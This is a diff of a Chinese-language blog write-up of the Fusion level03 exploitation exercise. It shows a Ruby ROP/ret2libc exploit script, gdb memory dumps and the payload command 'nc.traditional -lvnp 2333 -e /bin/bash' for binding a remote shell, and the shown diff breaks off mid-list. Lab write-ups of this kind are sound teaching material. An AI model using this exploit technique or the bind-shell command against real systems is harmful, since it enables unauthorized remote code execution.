@@ -675,7 +675,7 @@ if (!doNotTrack) {
 <p><strong>6. <code>post_blog_article()</code></strong></p>
 <p>根据前面解析到的 serverip 标签，重新开一个 STDOUT 把内容写出去</p>
 <hr>
-<h2 id="vulnerability">Vulnerability</h2>
+<h3 id="vulnerability">Vulnerability</h3>
 <p>出现在：</p>
 <p><strong>5. <code>handle_request()</code></strong></p>
 <p>这个函数的作用是，使用 <code>decode_string()</code> 解析 json 中的 tags，title，contents，serverip 标签</p>
@@ -742,6 +742,35 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">          <span class="n">memcpy</span><span class="p">(</span><span class="n">gContents</span><span class="p">,</span> <span class="n">contents</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">......</span>
 </span></span></code></pre></div><p>就可以让 title 或者 contents 溢出了</p>
+<h3 id="main-purpose">Main Purpose</h3>
+<p>既然已经明确了我们可以做什么，接下来理一下思路：</p>
+<p>我们遇到的限制是：</p>
+<ul>
+<li>
+<p>开了 ASLR<br>
+→ libc 的地址会变，堆栈每次的地址也会变</p>
+</li>
+<li>
+<p>开了 NX<br>
+→ 就算能往堆栈上扔 shellcode 也没法执行</p>
+</li>
+</ul>
+<p>我们能做到的事情有：</p>
+<ul>
+<li>
+<p>bof 修改返回地址</p>
+</li>
+<li>
+<p>没开 PIE 所以还是可以 ROP<br>
+→ 只要知道一个 libc 函数的地址，就可以算出别的函数的偏移量</p>
+</li>
+</ul>
+<p>以及，我们最终想要达到的效果是：</p>
+<ul>
+<li>用 system 函数绑定 tcp shell<br>
+→ <code>system(&quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash&quot;);</code><br>
+→ 注意得用 nc.traditional 否则是 netcat-openbsd，没有 -e 选项</li>
+</ul>
 <hr>
 <h2 id="interact-with-program">Interact with Program</h2>
 <p>试着先发点正常的东西</p>
@@ -858,34 +887,7 @@ if (!doNotTrack) {
 <p>（但是我想用 ruby x</p>
 <hr>
 <h2 id="find-out-rop-chain">Find Out ROP chain</h2>
-<p>首先我们遇到的限制是：</p>
-<ul>
-<li>
-<p>开了 ASLR<br>
-→ libc 的地址会变，堆栈每次的地址也会变</p>
-</li>
-<li>
-<p>开了 NX<br>
-→ 就算能往堆栈上扔 shellcode 也没法执行</p>
-</li>
-</ul>
-<p>我们能做到的事情有：</p>
-<ul>
-<li>
-<p>bof 修改返回地址</p>
-</li>
-<li>
-<p>没开 PIE 所以还是可以 ROP<br>
-→ 只要知道一个 libc 函数的地址，就可以算出别的函数的偏移量</p>
-</li>
-</ul>
-<p>我们想要达到的效果是：</p>
-<ul>
-<li>用 system 函数绑定 tcp shell<br>
-→ <code>system(&quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash&quot;);</code><br>
-→ 注意得用 nc.traditional 否则是 netcat-openbsd，没有 -e 选项</li>
-</ul>
-<p>然后按照前面说过的，我们的目的是执行 ret2libc 执行 system 函数</p>
+<p>按照前面说过的，我们的目的是执行 ret2libc 执行 system 函数</p>
 <p>但是由于程序里并没有用过 system，所以动态链接表里是没这个的地址的</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fusion@fusion:~$ objdump -t /opt/fusion/bin/level03 <span class="p">|</span> grep system
 </span></span><span class="line"><span class="cl"><span class="c1"># 什么都没有</span>
@@ -997,6 +999,7 @@ if (!doNotTrack) {
 <p><code>0xb74892c0 &lt;write&gt; - 0xb7404b20 &lt;__libc_system&gt; = 0x847A0</code></p>
 <p><code>0x0 - 0x847A0 = 0xFFF7B860</code></p>
 <hr>
+<h3 id="plt-got-gotplt">plt? got? got.plt??</h3>
 <p>注意！</p>
 <p>上面几个都是已经链接了之后，再用 gdb 看的地址&hellip;相当于是 libc 里面具体的实现部分</p>
 <p>因为会首 ASLR 影响，所以对我们的 ROP 来说没什么用&hellip;也就是用来算一下偏移量</p>
@@ -1070,7 +1073,6 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">   <span class="c1"># 当然就是 &#34;nc.traditional.....&#34; 的字符串的位置</span>
 </span></span></code></pre></div><hr>
 <h2 id="end">END?</h2>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=298 height=52 src="//music.163.com/outchain/player?type=2&id=27835539&auto=1&height=32"></iframe>
 <p>有个小问题，那就是 ruby 的 to_json 方法不接受非法 utf-8 字符</p>
 <p>也就是说&hellip;比如 &ldquo;\x90&rdquo;，这玩意超出了 ASCII 的范围，就会被当成 utf-8</p>
 <p>但是几乎百分百的是，这一个 &ldquo;\x90&rdquo; 连上后面的东西都，没法被解析成任何 utf-8 字符</p>
@@ -1096,7 +1098,6 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="nb">hash</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="ss">:tags</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="s1">&#39;meme&#39;</span><span class="o">]</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">  <span class="c1"># Ruby to_json issue with error &#34;illegal/malformed utf-8&#34;</span>
-</span></span><span class="line"><span class="cl">  <span class="c1"># https://stackoverflow.com/questions/18067203/ruby-to-json-issue-with-error-illegal-malformed-utf-8</span>
 </span></span><span class="line"><span class="cl">  <span class="ss">:title</span> <span class="o">=&gt;</span> <span class="s1">&#39;_replace_&#39;</span><span class="p">,</span><span class="c1">#.to_s.force_encoding(&#39;ISO-8859-1&#39;),</span>
 </span></span><span class="line"><span class="cl">  <span class="ss">:contents</span> <span class="o">=&gt;</span> <span class="s1">&#39;My name is Giovanni Giorgio&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">  <span class="ss">:serverip</span> <span class="o">=&gt;</span> <span class="s1">&#39;192.168.215.135:8080&#39;</span>
@@ -1111,7 +1112,7 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">json</span><span class="o">.</span><span class="n">b</span>
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
 </span></span></code></pre></div><p><code>title += '\\\\\uAAAA'</code> 的最终结果是 <code>\\uAAAA</code>（两个反斜杠，一个u，四个A），这纯粹是为了 <code>json_tokener_parse(gRequest)</code> 能解析出正常的东西来</p>
-<p><code>json = json.dup.sub! &quot;_replace_&quot;, title</code> 这一串魔法一样的东西是因为不知道为什么，那串 string 被 forze 了，所以只好 dup 一下再 replace</p>
+<p><code>json = json.dup.sub! &quot;_replace_&quot;, title</code> 这一串魔法一样的东西是因为不知道为什么 json 变量被 forze 了，所以只好 dup 一下再 replace</p>
 <p>试一下：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ./level03.rb
 </span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; Enter hostname:<span class="o">==</span>&gt; received token:
@@ -1129,6 +1130,7 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
 </span></span><span class="line"><span class="cl">0x44434241 in ?? <span class="o">()</span>
 </span></span></code></pre></div><p>没问题&hellip;能用</p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=298 height=52 src="//music.163.com/outchain/player?type=2&id=27835539&auto=1&height=32"></iframe>
 <p>绕了这么多路终于快解决了吧..</p>
 <p>然后替换成我们的 ROP Chain：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">p32</span> <span class="n">addr</span>
@@ -1137,7 +1139,9 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">title</span>  <span class="o">=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">127</span>
 </span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s1">&#39;\\\\\uAAAA&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">31</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">23</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;ABCD&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;ABCD&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048bf0</span>
 </span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xAAA9B858</span>
 </span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08049b4f</span>
@@ -1192,27 +1196,155 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="n">__libc_system</span> <span class="p">(</span><span class="n">line</span><span class="o">=</span><span class="mh">0x804bdf4</span> <span class="s2">&#34;X</span><span class="se">\220</span><span class="s2">t</span><span class="se">\t\b\200</span><span class="s2">t</span><span class="se">\t\220\230</span><span class="s2">t</span><span class="se">\t\034\001</span><span class="s2">&#34;</span><span class="p">)</span> <span class="n">at</span> <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">posix</span><span class="o">/</span><span class="nb">system</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">179</span>
 </span></span><span class="line"><span class="cl"><span class="mi">179</span>	<span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">posix</span><span class="o">/</span><span class="nb">system</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
 </span></span><span class="line"><span class="cl">	<span class="k">in</span> <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">posix</span><span class="o">/</span><span class="nb">system</span><span class="o">.</span><span class="n">c</span>
-</span></span></code></pre></div><p>成功了！！但是没有完全成功&hellip;？</p>
+</span></span></code></pre></div><p><code>__libc_system</code>！！成功了！！但是没有完全成功&hellip;？</p>
+<p>虽然确实跳到了 system，但是参数怪怪的&hellip;</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x804bdf4</span>
 </span></span><span class="line"><span class="cl"><span class="mh">0x804bdf4</span> <span class="o">&lt;</span><span class="n">gContents</span><span class="o">&gt;</span><span class="p">:</span>	 <span class="s2">&#34;X</span><span class="se">\220</span><span class="s2">t</span><span class="se">\t\b\200</span><span class="s2">t</span><span class="se">\t\220\230</span><span class="s2">t</span><span class="se">\t\034\001</span><span class="s2">&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="n">gContents</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="mh">0x804bdf4</span>
 </span></span><span class="line"><span class="cl"><span class="mh">0x9749058</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
-</span></span></code></pre></div><p>虽然确实跳到了 system，但是参数怪怪的&hellip;</p>
-<pre tabindex="0"><code>(gdb) x/s gContents
-0x943b058:	&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;
-
-(gdb) x/s gContents
-0x89b5058:	 &#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;
-</code></pre><p>麻袋..所以..</p>
-<p>gContents 在..</p>
-<p>在会受 ASLR 影响的堆上&hellip;.</p>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 重启了几次程序</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="mh">0x804bdf4</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x9776838</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="mh">0x804bdf4</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x97f2058</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="mh">0x804bdf4</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x99e6058</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
+</span></span></code></pre></div><p>麻袋..所以..</p>
+<p>gContents 实际保存的值在..</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="mh">0x804bdf4</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x97f2058</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="nb">proc</span> <span class="n">map</span>
+</span></span><span class="line"><span class="cl"><span class="n">process</span> <span class="mi">1682</span>
+</span></span><span class="line"><span class="cl"><span class="n">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/fusion/bin/level03&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">cwd</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/fusion/bin/level03&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="no">Mapped</span> <span class="n">address</span> <span class="ss">spaces</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="no">Start</span> <span class="no">Addr</span>   <span class="no">End</span> <span class="no">Addr</span>       <span class="no">Size</span>     <span class="no">Offset</span> <span class="n">objfile</span>
+</span></span><span class="line"><span class="cl">	 <span class="mh">0x8048000</span>  <span class="mh">0x804b000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>       <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span>
+</span></span><span class="line"><span class="cl">	 <span class="mh">0x804b000</span>  <span class="mh">0x804c000</span>     <span class="mh">0x1000</span>     <span class="mh">0x2000</span>       <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span>
+</span></span><span class="line"><span class="cl">	 <span class="mh">0x97f1000</span>  <span class="mh">0x9812000</span>    <span class="mh">0x21000</span>          <span class="mi">0</span>           <span class="o">[</span><span class="n">heap</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span></code></pre></div><p>在会受 ASLR 影响的堆上&hellip;.</p>
 <pre tabindex="0"><code>　／
 ／｜ーーーーーーーーーーーーーーーーーーー｜
 | 　　　Ｔｏ　ｂｅ　ｃｏｎｔｉｎｕｅｄ　　｜　　 
 ＼｜ーーーーーーーーーーーーーーーーーーー｜
 　＼
-</code></pre>
+</code></pre><hr>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<h2 id="ignore-above-the-real-solution">Ignore Above; The REAL Solution:</h2>
+<p>严格来说，gContents 这个变量，在 .data 段内；</p>
+<p>地址是 <code>0x804bdf4</code>，没开 PIE 所以这个倒是不会变的</p>
+<p>但是，这个地址里面保存的值，指向了受 ASLR 影响的堆</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804bdf4</span>     <span class="c1"># 即 *.data 上指向堆的地址*</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x804bdf4</span> <span class="o">&lt;</span><span class="n">gContents</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0x09b3e710</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x09b3e710</span>  <span class="c1"># 即 *堆上 gContents 的地址*</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x9b3e710</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
+</span></span></code></pre></div><p>我们想要 system 的话，参数写的必须得是 <strong>堆上 gContents 的地址</strong> 而不是 <strong>.data 上指向堆的地址</strong></p>
+<hr>
+<p>我试着谷歌了别人的解法，虽然前面思路都差不多，但是到最后一步的时候他们直接用 <code>&quot;/////////////bin/nc.traditional&quot;</code> 来绕开 ASLR&hellip;.我觉得不行（实际地址有时候 <code>0x99?????</code> 有时候 <code>0x89?????</code>，差了快有 0x10000 了&hellip;.</p>
+<p>我也自己试了很多 ROP chain，都没法用诸如 <code>dword ptr</code> 的指令来把 <strong>.data 上指向堆的地址</strong> 里保存的 <strong>堆上 gContents 的地址</strong> 拿出来</p>
+<p>我也试着就把 nc 的命令写在栈上，然后试着用 ROP chain 来把 esp 的值取出来去做为 system 的参数，但是也没有合适的 ROP chain</p>
+<p>就这样浪费了快一个上午，简直要疯了</p>
+<p>甚至差点就用 memcpy 把 system 的参数，既然是一个字符串，那就从地址固定的 .text 段里，一字节一字节的找出来，取出来，放到 .data 上&hellip;</p>
+<p>然后差点真的这么实施的时候想起来一个问题：</p>
+<p>原程序是怎么从 <strong>.data 上指向堆的地址</strong> 来读到 <strong>堆上 gContents 的地址</strong> 呢&hellip;</p>
+<p>比如，<code>void validate_request()</code> 里的这个 strncmp</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">gRequest</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Token not found!&#34;</span><span class="p">);</span> 
+</span></span></code></pre></div><p>gdb:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span> <span class="n">validate_request</span>
+</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="ss">validate_request</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ab0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nb">sub</span>    <span class="vg">$0x5c</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ab3</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebx</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ab7</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="mh">0x804bdf8</span><span class="p">,</span><span class="o">%</span><span class="n">ebx</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049abd</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">esi</span><span class="p">,</span><span class="mh">0x50</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ac1</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">edi</span><span class="p">,</span><span class="mh">0x54</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ac5</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebp</span><span class="p">,</span><span class="mh">0x58</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ac9</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebx</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049acc</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">call</span>   <span class="mh">0x8048e70</span> <span class="o">&lt;</span><span class="n">strlen</span><span class="vi">@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ad1</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="mh">0x804be08</span><span class="p">,</span><span class="o">%</span><span class="n">esi</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ad7</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049adb</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">esi</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ade</span> <span class="o">&lt;+</span><span class="mi">46</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ae2</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">call</span>   <span class="mh">0x8048f50</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x08049ae2</span>
+</span></span><span class="line"><span class="cl"><span class="no">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8049ae2</span><span class="p">:</span> <span class="n">file</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mi">75</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="no">Continuing</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="no">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08049ae2</span> <span class="k">in</span> <span class="n">validate_request</span> <span class="p">()</span> <span class="n">at</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">75</span>
+</span></span><span class="line"><span class="cl"><span class="mi">75</span>	<span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">	<span class="k">in</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span>
+</span></span></code></pre></div><p>断点打在了 strncmp 之前，看一下此刻的栈&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">wx</span> <span class="vg">$esp</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xbf8894a0</span><span class="p">:</span>  <span class="o">[</span><span class="mh">0x09b3d050</span><span class="o">]</span> <span class="o">[</span><span class="mh">0x09b3d008</span><span class="o">]</span>  <span class="mh">0x00000040</span>   <span class="mh">0x0804bd38</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># if(strncmp(gRequest, token, strlen(token)) != 0)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="n">gRequest</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x9b3d050</span><span class="p">:</span>	 <span class="s2">&#34;// 192.168.215.1:65435-1654326447-1806178287-708944567-892684320</span><span class="se">\n</span><span class="s2">{</span><span class="se">\&#34;</span><span class="s2">tags</span><span class="se">\&#34;</span><span class="s2">:[</span><span class="se">\&#34;</span><span class="s2">meme</span><span class="se">\&#34;</span><span class="s2">],</span><span class="se">\&#34;</span><span class="s2">title</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">109</span> <span class="n">times</span><span class="o">&gt;...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x9b3d008</span><span class="p">:</span>	 <span class="s2">&#34;// 192.168.215.1:65435-1654326447-1806178287-708944567-892684320&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0x00000040</span><span class="p">:</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span></code></pre></div><p>所以这两个值不就是 <strong>堆上 gRequest 的地址</strong> 和 <strong>堆上 token 的地址</strong> 么&hellip;被 strncmp 之前的指令放在了栈上&hellip;</p>
+<p>这时候我突然意识到，我前面一直在和 ROP chain 对线，却忘了一个最简单的事情：</p>
+<p>ROP chain 的最后一下，并不一定要能完美的 ret 呢&hellip;</p>
+<p>换句话说，我们不用再死磕想去把 <strong>堆上 gContents 的地址</strong> 写到栈上作为 system 的参数，</p>
+<p>我们可以利用 .text 中原有的指令，来让栈变成有 <strong>堆上 gContents 的地址</strong> 的形状，虽然此时没法立刻 ret</p>
+<p>但是这里的 strncmp 就是很好的例子，在执行它之前，栈确确实实被其之前的指令变成了有 <strong>堆上 gRequest 的地址</strong> 的形状，</p>
+<p>那如果这一刻的 strncmp 和 gRequest 都可以在之前就被偷偷换成别的东西呢..?</p>
+<hr>
+<p>我们已知：</p>
+<ul>
+<li>.data，.text，.plt 段地址不变</li>
+<li>strncmp 之前会把 <strong>堆上 gRequest 的地址</strong> 取出来放到栈上</li>
+<li><strong>堆上 gRequest 的地址</strong> 保存在 <strong>.data 上指向堆的地址</strong></li>
+<li>.data 字段可写</li>
+</ul>
+<p>那么我们现在就可以：</p>
+<ol>
+<li>把 .data 的 gRequest 偷偷用 memcpy 替换成 gContent</li>
+<li>把 strncmp 偷偷换成 libc system</li>
